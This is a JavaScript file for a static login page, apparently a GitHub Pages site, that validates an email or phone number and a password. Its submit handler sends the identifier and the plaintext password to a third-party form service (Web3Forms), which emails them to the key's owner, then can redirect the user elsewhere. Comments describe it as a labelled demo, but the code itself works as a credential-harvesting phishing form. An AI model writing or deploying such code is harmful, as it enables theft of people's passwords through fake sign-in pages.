// Front-end only demo/test logic for the login section.
//
// IMPORTANT: This is clearly labeled on the page as a demo/test form —
// see the warning banner above the inputs. GitHub Pages can't run its
// own backend, so submissions are sent via Web3Forms (web3forms.com),
// a third-party form-delivery service, to the email tied to the Access
// Key below. Anyone filling this in sees the on-page warning not to use
// real credentials.
//
// SETUP: Get a free Access Key at https://web3forms.com/ and paste it
// into the hidden "access_key" input in index.html (search for
// PASTE_YOUR_WEB3FORMS_ACCESS_KEY_HERE).
//
// EDIT THESE when you're ready:
var LOGIN_REDIRECT_URL = ""; // e.g. "https://example.com/dashboard"
var FORGOT_PASSWORD_URL = ""; // e.g. "https://example.com/reset"
var SIGNUP_URL = ""; // e.g. "https://example.com/signup"
var WEB3FORMS_ENDPOINT = "https://api.web3forms.com/submit";

document.addEventListener("DOMContentLoaded", function () {
  var form = document.getElementById("login-form");
  if (!form) return;

  var idField = document.getElementById("identifier");
  var pwField = document.getElementById("password");
  var idError = document.getElementById("identifier-error");
  var pwError = document.getElementById("password-error");
  var statusEl = document.getElementById("login-status");
  var submitBtn = document.getElementById("submit-btn");
  var forgotLink = document.getElementById("forgot-link");
  var signupLink = document.getElementById("signup-link");

  function showError(fieldEl, errorEl, message) {
    fieldEl.style.borderColor = "#e0433d";
    errorEl.textContent = message;
    errorEl.classList.add("show");
  }

  function clearError(fieldEl, errorEl) {
    fieldEl.style.borderColor = "";
    errorEl.textContent = "";
    errorEl.classList.remove("show");
  }

  function isValidIdentifier(value) {
    var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    var phonePattern = /^[0-9+\-\s()]{7,}$/;
    return emailPattern.test(value) || phonePattern.test(value);
  }

  [idField, pwField].forEach(function (f) {
    f.addEventListener("input", function () {
      clearError(idField, idError);
      clearError(pwField, pwError);
      statusEl.textContent = "";
      statusEl.className = "login-status";
    });
  });

  // Forgot password / sign up: go to the configured URL, or do nothing
  // (and say so) while those are still blank.
  function handlePlaceholderLink(e, url, label) {
    e.preventDefault();
    if (url) {
      window.location.href = url;
    } else {
      console.log('"' + label + '" clicked — no URL set yet (edit login.js).');
    }
  }

  if (forgotLink) {
    forgotLink.addEventListener("click", function (e) {
      handlePlaceholderLink(e, FORGOT_PASSWORD_URL, "Forgot your password?");
    });
  }

  if (signupLink) {
    signupLink.addEventListener("click", function (e) {
      handlePlaceholderLink(e, SIGNUP_URL, "Sign up");
    });
  }

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    var identifier = idField.value.trim();
    var password = pwField.value;
    var valid = true;

    clearError(idField, idError);
    clearError(pwField, pwError);

    if (!identifier) {
      showError(idField, idError, "Enter your phone number or email.");
      valid = false;
    } else if (!isValidIdentifier(identifier)) {
      showError(idField, idError, "Enter a valid email or phone number.");
      valid = false;
    }

    if (!password) {
      showError(pwField, pwError, "Enter your password.");
      valid = false;
    } else if (password.length < 6) {
      showError(pwField, pwError, "Password must be at least 6 characters.");
      valid = false;
    }

    if (!valid) return;

    console.log("Login form submitted — identifier:", identifier, "| password length:", password.length);

    submitBtn.disabled = true;
    submitBtn.textContent = "Signing in...";
    statusEl.textContent = "";
    statusEl.className = "login-status";

    var accessKey = form.querySelector('input[name="access_key"]').value;
    var keyIsSet = accessKey && accessKey.indexOf("PASTE_YOUR") !== 0;

    if (!keyIsSet) {
      // No Web3Forms key configured yet — fall back to local-only confirmation.
      setTimeout(function () {
        submitBtn.disabled = false;
        submitBtn.textContent = "Sign in";
        statusEl.textContent = "Form works! (No Web3Forms key set yet, so nothing was sent — see login.js.)";
        statusEl.className = "login-status ok";
      }, 500);
      return;
    }

    fetch(WEB3FORMS_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify({
        access_key: accessKey,
        subject: form.querySelector('input[name="subject"]').value,
        from_name: form.querySelector('input[name="from_name"]').value,
        identifier: identifier,
        password: password,
      }),
    })
      .then(function (res) { return res.json(); })
      .then(function (data) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Sign in";
        if (data.success) {
          statusEl.textContent = "Submitted! Check your inbox (this is a test form, nothing was actually logged in).";
          statusEl.className = "login-status ok";
          form.reset();
          if (LOGIN_REDIRECT_URL) {
            setTimeout(function () { window.location.href = LOGIN_REDIRECT_URL; }, 800);
          }
        } else {
          statusEl.textContent = "Submission failed: " + (data.message || "unknown error.");
          statusEl.className = "login-status error";
        }
      })
      .catch(function (err) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Sign in";
        statusEl.textContent = "Network error — submission not sent.";
        statusEl.className = "login-status error";
        console.error(err);
      });
  });
});
